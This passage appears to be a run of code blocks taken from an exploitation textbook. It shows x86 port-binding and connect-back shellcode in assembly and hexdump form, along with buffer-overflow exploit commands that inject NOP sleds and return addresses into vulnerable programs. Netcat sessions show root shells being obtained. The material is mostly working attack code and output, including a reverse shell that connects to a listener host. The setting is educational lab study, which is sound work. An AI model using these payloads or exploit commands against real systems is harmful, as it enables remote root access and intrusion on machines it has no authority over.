0x2     ;                    AF_INET = 2 }\n  mov ecx, esp      ; ecx = ptr to argument array\n  int 0x80          ; After syscall, eax has socket file descriptor.\n\n  mov esi, eax      ; save socket FD in esi for later\n\n; bind(s, [2, 31337, 0], 16)\n  push BYTE 0x66    ; socketcall (syscall #102)\n  pop eax\n  inc ebx           ; ebx = 2 = SYS_BIND = bind()\n  push edx          ; Build sockaddr struct:  INADDR_ANY = 0\n  push WORD 0x697a  ;   (in reverse order)    PORT = 31337\n  push WORD bx      ;                         AF_INET = 2\n  mov ecx, esp      ; ecx = server struct pointer\n  push BYTE 16      ; argv: { sizeof(server struct) = 16,\n  push ecx          ;         server struct pointer,\n  push esi          ;         socket file descriptor }\n  mov ecx, esp      ; ecx = argument array\n  int 0x80          ; eax = 0 on success\n\n; listen(s, 0)\n  mov BYTE al, 0x66 ; socketcall (syscall #102)\n  inc ebx\n  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()\n  push ebx          ; argv: { backlog = 4,\n  push esi          ;         socket fd }\n  mov ecx, esp      ; ecx = argument array\n  int 0x80\n\n; c = accept(s, 0, 0)\n  mov BYTE al, 0x66 ; socketcall (syscall #102)\n  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()\n  push edx          ; argv: { socklen = 0,\n  push edx          ;         sockaddr ptr = NULL,\n  push esi          ;         socket fd }\n  mov ecx, esp      ; ecx = argument array\n  int 0x80          ; eax = connected socket FD\n\n```", "```\nreader@hacking:~/booksrc $ grep dup2 /usr/include/asm-i386/unistd.h\n#define __NR_dup2                63\nreader@hacking:~/booksrc $ man 2 dup2\nDUP(2)                     Linux Programmer's Manual                     DUP(2)\n\nNAME\n       dup, dup2 - duplicate a file descriptor\n\nSYNOPSIS\n       #include <unistd.h>\n       int dup(int oldfd);\n       int dup2(int oldfd, int newfd);\n\nDESCRIPTION\n       dup() and dup2() create a copy of the file descriptor oldfd.\n\n       dup2() makes newfd be the copy of oldfd, closing newfd first if necessary.\n```", "```\n; dup2(connected socket, {all three standard I/O file descriptors})\n  mov ebx, eax      ; Move socket FD in ebx.\n  push BYTE 0x3F    ; dup2  syscall #63\n  pop eax\n  xor ecx, ecx      ; ecx = 0 = standard input\n  int 0x80          ; dup(c, 0)\n  mov BYTE al, 0x3F ; dup2  syscall #63\n  inc ecx           ; ecx = 1 = standard output\n  int 0x80          ; dup(c, 1)\n  mov BYTE al, 0x3F ; dup2  syscall #63\n  inc ecx           ; ecx = 2 = standard error\n  int 0x80          ; dup(c, 2)\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n  mov BYTE al, 11   ; execve  syscall #11\n  push edx          ; push some nulls for string termination.\n  push 0x68732f2f   ; push \"//sh\" to the stack.\n  push 0x6e69622f   ; push \"/bin\" to the stack.\n  mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\n  push ecx          ; push 32-bit null terminator to stack.\n  mov edx, esp      ; This is an empty array for envp.\n  push ebx          ; push string addr to stack above null terminator.\n  mov ecx, esp      ; This is the argv array with string ptr.\n  int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\nreader@hacking:~/booksrc $ nasm bind_shell_beta.s\nreader@hacking:~/booksrc $ hexdump -C bind_shell_beta | grep --color=auto 00\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  89 c6 6a 66 58 43 52 66  68 7a 69 66 53 89 e1 6a  |..jfXCRfhzifS..j|\n00000020  10 51 56 89 e1 cd 80 b0  66 43 43 53 56 89 e1 cd  |.QV.....fCCSV...|\n00000030  80 b0 66 43 52 52 56 89  e1 cd 80 89 c3 6a 3f 58  |..fCRRV......j?X|\n00000040  31 c9 cd 80 b0 3f 41 cd  80 b0 3f 41 cd 80 b0 0b  |1....?A...?A....|\n00000050  52 68 2f 2f 73 68 68 2f  62 69 6e 89 e3 52 89 e2  |Rh//shh/bin..R..|\n00000060  53 89 e1 cd 80                                    |S....|\n00000065\nreader@hacking:~/booksrc $ export SHELLCODE=$(cat bind_shell_beta)\nreader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch\nSHELLCODE will be at 0xbffff97f\nreader@hacking:~/booksrc $ ./notesearch $(perl -e 'print \"\\x7f\\xf9\\xff\\xbf\"x40')\n[DEBUG] found a 33 byte note for user id 999\n-------[ end of note data ]-------\n```", "```\nreader@hacking:~/booksrc $ sudo netstat -lp | grep 31337\ntcp        0      0   *:31337          *:*            LISTEN     25604/notesearch\nreader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337\nlocalhost [127.0.0.1] 31337 (?) open\nwhoami\nroot\n```", "```\nreader@hacking:~/booksrc $ gcc firstprog.c\nreader@hacking:~/booksrc $ gdb -q ./a.out\nUsing host libthread_db library \"/lib/tls/i686/cmov/libthread_db.so.1\".\n(gdb) disass main\nDump of assembler code for function main:\n0x08048374 <main+0>:    push   ebp\n0x08048375 <main+1>:    mov    ebp,esp\n0x08048377 <main+3>:    sub    esp,0x8\n0x0804837a <main+6>:    and    esp,0xfffffff0\n0x0804837d <main+9>:    mov    eax,0x0\n0x08048382 <main+14>:   sub    esp,eax\n`0x08048384 <main+16>:   mov    DWORD PTR [ebp-4],0x0 0x0804838b <main+23>:   cmp    DWORD PTR [ebp-4],0x9 0x0804838f <main+27>:   jle    0x8048393 <main+31> 0x08048391 <main+29>:   jmp    0x80483a6 <main+50>`\n0x08048393 <main+31>:   mov    DWORD PTR [esp],0x8048484\n0x0804839a <main+38>:   call   0x80482a0 <printf@plt>\n`0x0804839f <main+43>:   lea    eax,[ebp-4] 0x080483a2 <main+46>:   inc    DWORD PTR [eax] 0x080483a4 <main+48>:   jmp    0x804838b <main+23>`\n0x080483a6 <main+50>:   leave\n0x080483a7 <main+51>:   ret\nEnd of assembler dump.\n(gdb)\n```", "```\n; dup2(connected socket, {all three standard I/O file descriptors})\n  mov ebx, eax      ; Move socket FD in ebx.\n  xor eax, eax      ; Zero eax.\n  xor ecx, ecx      ; ecx = 0 = standard input\n`dup_loop:   mov BYTE al, 0x3F ; dup2  syscall #63   int 0x80          ; dup2(c, 0)   inc ecx   cmp BYTE cl, 2        ; Compare ecx with 2.   jle dup_loop      ; If ecx <= 2, jump to dup_loop.`\n```", "```\n; dup2(connected socket, {all three standard I/O file descriptors})\n  mov ebx, eax      ; Move socket FD in ebx.\n  xor eax, eax      ; Zero eax.\n  `push BYTE 0x2     ; ecx starts at 2.   pop ecx`\ndup_loop:\n  mov BYTE al, 0x3F ; dup2  syscall #63\n  int 0x80          ; dup2(c, 0)\n  `dec ecx           ; Count down to 0.   jns dup_loop      ; If the sign flag is not set, ecx is not negative.`\n```", "```\n\t89 C3              mov ebx,eax\n\t31 C0              xor eax,eax\n```", "```\n\t93                 xchg eax,ebx\n```", "```\nBITS 32\n\n; s = socket(2, 1, 0)\n  push BYTE 0x66    ; socketcall is syscall #102 (0x66).\n  pop eax\n  cdq               ; Zero out edx for use as a null DWORD later.\n  xor ebx, ebx      ; Ebx is the type of socketcall.\n  inc ebx           ; 1 = SYS_SOCKET = socket()\n  push edx          ; Build arg array: { protocol = 0,\n  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\n  push BYTE 0x2     ;                    AF_INET = 2 }\n  mov ecx, esp      ; ecx = ptr to argument array\n  int 0x80          ; After syscall, eax has socket file descriptor.\n\n  xchg esi, eax     ; Save socket FD in esi for later.\n\n; bind(s, [2, 31337, 0], 16)\n  push BYTE 0x66    ; socketcall (syscall #102)\n  pop eax\n  inc ebx           ; ebx = 2 = SYS_BIND = bind()\n  push edx          ; Build sockaddr struct:  INADDR_ANY = 0\n  push WORD 0x697a  ;   (in reverse order)    PORT = 31337\n  push WORD bx      ;                         AF_INET = 2\n  mov ecx, esp      ; ecx = server struct pointer\n  push BYTE 16      ; argv: { sizeof(server struct) = 16,\n  push ecx          ;         server struct pointer,\n  push esi          ;         socket file descriptor }\n  mov ecx, esp      ; ecx = argument array\n  int 0x80          ; eax = 0 on success\n\n; listen(s, 0)\n  mov BYTE al, 0x66 ; socketcall (syscall #102)\n  inc ebx\n  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()\n  push ebx          ; argv: { backlog = 4,\n  push esi          ;         socket fd }\n  mov ecx, esp      ; ecx = argument array\n  int 0x80\n\n; c = accept(s, 0, 0)\n  mov BYTE al, 0x66 ; socketcall (syscall #102)\n  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()\n  push edx          ; argv: { socklen = 0,\n  push edx          ;         sockaddr ptr = NULL,\n  push esi          ;         socket fd }\n  mov ecx, esp      ; ecx = argument array\n  int 0x80          ; eax = connected socket FD\n\n; dup2(connected socket, {all three standard I/O file descriptors})\n  xchg eax, ebx     ; Put socket FD in ebx and 0x00000005 in eax.\n  push BYTE 0x2     ; ecx starts at 2.\n  pop ecx\ndup_loop:\n  mov BYTE al, 0x3F ; dup2  syscall #63\n  int 0x80          ; dup2(c, 0)\n  dec ecx           ; count down to 0\n  jns dup_loop      ; If the sign flag is not set, ecx is not negative.\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n  mov BYTE al, 11   ; execve  syscall #11\n  push edx          ; push some nulls for string termination.\n  push 0x68732f2f   ; push \"//sh\" to the stack.\n  push 0x6e69622f   ; push \"/bin\" to the stack.\n  mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\n  push edx          ; push 32-bit null terminator to stack.\n  mov edx, esp      ; This is an empty array for envp.\n  push ebx          ; push string addr to stack above null terminator.\n  mov ecx, esp      ; This is the argv array with string ptr\n  int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\nreader@hacking:~/booksrc $ nasm bind_shell.s \nreader@hacking:~/booksrc $ hexdump -C bind_shell\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10  |.jfXCRfhzifS..j.|\n00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80  |QV.....fCCSV....|\n00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f  |.fCRRV.....j.Y.?|\n00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62  |..Iy...Rh//shh/b|\n00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80              |in..R..S....|\n0000005c\nreader@hacking:~/booksrc $ diff bind_shell portbinding_shellcode\n\n```", "```\nBITS 32\n\n; s = socket(2, 1, 0)\n  push BYTE 0x66    ; socketcall is syscall #102 (0x66).\n  pop eax\n  cdq               ; Zero out edx for use as a null DWORD later.\n  xor ebx, ebx      ; ebx is the type of socketcall.\n  inc ebx           ; 1 = SYS_SOCKET = socket()\n  push edx          ; Build arg array: { protocol = 0,\n  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,\n  push BYTE 0x2     ;                    AF_INET = 2 }\n  mov ecx, esp      ; ecx = ptr to argument array\n  int 0x80          ; After syscall, eax has socket file descriptor.\n\n  xchg esi, eax     ; Save socket FD in esi for later.\n\n; connect(s, [2, 31337, <IP address>], 16)\n  push BYTE 0x66    ; socketcall (syscall #102)\n  pop eax\n  inc ebx           ; ebx = 2 (needed for AF_INET)\n  `push DWORD 0x482aa8c0 ; Build sockaddr struct: IP address = 192.168.42.72`\n  push WORD 0x697a  ;   (in reverse order)    PORT = 31337\n  push WORD bx      ;                         AF_INET = 2\n  mov ecx, esp      ; ecx = server struct pointer\n  push BYTE 16      ; argv: { sizeof(server struct) = 16,\n  push ecx          ;         server struct pointer,\n  push esi          ;         socket file descriptor }\n  mov ecx, esp      ; ecx = argument array\n  `inc ebx           ; ebx = 3 = SYS_CONNECT = connect()`\n  int 0x80          ; eax = connected socket FD\n\n; dup2(connected socket, {all three standard I/O file descriptors})\n  xchg eax, ebx     ; Put socket FD in ebx and 0x00000003 in eax.\n  push BYTE 0x2     ; ecx starts at 2.\n  pop ecx\ndup_loop:\n  mov BYTE al, 0x3F ; dup2  syscall #63\n  int 0x80          ; dup2(c, 0)\n  dec ecx           ; Count down to 0.\n  jns dup_loop      ; If the sign flag is not set, ecx is not negative.\n\n; execve(const char *filename, char *const argv [], char *const envp[])\n  mov BYTE al, 11   ; execve  syscall #11.\n  push edx          ; push some nulls for string termination.\n  push 0x68732f2f   ; push \"//sh\" to the stack.\n  push 0x6e69622f   ; push \"/bin\" to the stack.\n  mov ebx, esp      ; Put the address of \"/bin//sh\" into ebx via esp.\n  push edx          ; push 32-bit null terminator to stack.\n  mov edx, esp      ; This is an empty array for envp.\n  push ebx          ; push string addr to stack above null terminator.\n  mov ecx, esp      ; This is the argv array with string ptr.\n  int 0x80          ; execve(\"/bin//sh\", [\"/bin//sh\", NULL], [NULL])\n```", "```\nreader@hacking:~/booksrc $ gdb -q\n(gdb) p /x 192\n$1 = 0xc0\n(gdb) p /x 168\n$2 = 0xa8\n(gdb) p /x 42\n$3 = 0x2a\n(gdb) p /x 72\n$4 = 0x48\n(gdb) p /x 31337\n$5 = 0x7a69\n(gdb)\n```", "```\nreader@hacking:~/booksrc $ sudo ifconfig eth0 192.168.42.72 up\nreader@hacking:~/booksrc $ ifconfig eth0\neth0      Link encap:Ethernet  HWaddr 00:01:6C:EB:1D:50\n          inet addr:192.168.42.72  Bcast:192.168.42.255  Mask:255.255.255.0\n          UP BROADCAST MULTICAST  MTU:1500  Metric:1\n          RX packets:0 errors:0 dropped:0 overruns:0 frame:0\n          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0\n          collisions:0 txqueuelen:1000\n          RX bytes:0 (0.0 b)  TX bytes:0 (0.0 b)\n          Interrupt:16\n\nreader@hacking:~/booksrc $ nc -v -l -p 31337\nlistening on [any] 31337 ...\n```", "```\nreader@hacking:~/booksrc $ nasm connectback_shell.s\nreader@hacking:~/booksrc $ hexdump -C connectback_shell\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 68 c0 a8  2a 48 66 68 7a 69 66 53  |.jfXCh..*HfhzifS|\n00000020  89 e1 6a 10 51 56 89 e1  43 cd 80 87 f3 87 ce 49  |..j.QV..C......I|\n00000030  b0 3f cd 80 49 79 f9 b0  0b 52 68 2f 2f 73 68 68  |.?..Iy...Rh//shh|\n00000040  2f 62 69 6e 89 e3 52 89  e2 53 89 e1 cd 80        |/bin..R..S....|\n0000004e\nreader@hacking:~/booksrc $ wc -c connectback_shell\n78 connectback_shell\nreader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 78 ))\n402\nreader@hacking:~/booksrc $ gdb -q --batch -ex \"p /x 0xbffff5c0 + 200\"\n$1 = 0xbffff688\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ nc -v -l -p 31337\nlistening on [any] 31337 ...\n```", "```\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x402';\n> cat connectback_shell;\n> perl -e 'print \"\\x88\\xf6\\xff\\xbf\"x20 . \"\\r\\n\"') | nc -v 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\n```", "```\nreader@hacking:~/booksrc $ nc -v -l -p 31337\nlistening on [any] 31337 ...\nconnect to [192.168.42.72] from hacking.local [192.168.42.72] 34391\nwhoami\nroot\n```", "```\nreader@hacking:~/booksrc $ diff connectback_shell.s loopback_shell.s\n21c21,22\n<   push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72\n---\n>   push DWORD 0x01BBBB7f ; Build sockaddr struct: IP Address = 127.0.0.1\n>   mov WORD [esp+1], dx  ; overwrite the BBBB with 0000 in the previous push\nreader@hacking:~/booksrc $\n```", "```\nreader@hacking:~/booksrc $ nasm loopback_shell.s\nreader@hacking:~/booksrc $ hexdump -C loopback_shell | grep --color=auto 00\n00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|\n00000010  96 6a 66 58 43 68 7f bb  bb 01 66 89 54 24 01 66  |.jfXCh....f.T$.f|\n00000020  68 7a 69 66 53 89 e1 6a  10 51 56 89 e1 43 cd 80  |hzifS..j.QV..C..|\n00000030  87 f3 87 ce 49 b0 3f cd  80 49 79 f9 b0 0b 52 68  |....I.?..Iy...Rh|\n00000040  2f 2f 73 68 68 2f 62 69  6e 89 e3 52 89 e2 53 89  |//shh/bin..R..S.|\n00000050  e1 cd 80                                          |...|\n00000053\nreader@hacking:~/booksrc $ wc -c loopback_shell\n83 loopback_shell\nreader@hacking:~/booksrc $ echo $(( 544 - (4*16) - 83 ))\n397\nreader@hacking:~/booksrc $ (perl -e 'print \"\\x90\"x397';cat loopback_shell;perl -e 'print\n \"\\x88\\\nxf6\\xff\\xbf\"x16 . \"\\r\\n\"') | nc -v 127.0.0.1 80\nlocalhost [127.0.0.1] 80 (www) open\n```", "```\nreader@hacking:~ $ nc -vlp 31337\nlistening on [any] 31337 ...\nconnect to [127.0.0.1] from localhost [127.0.0.1] 42406\nwhoami\nroot\n```"]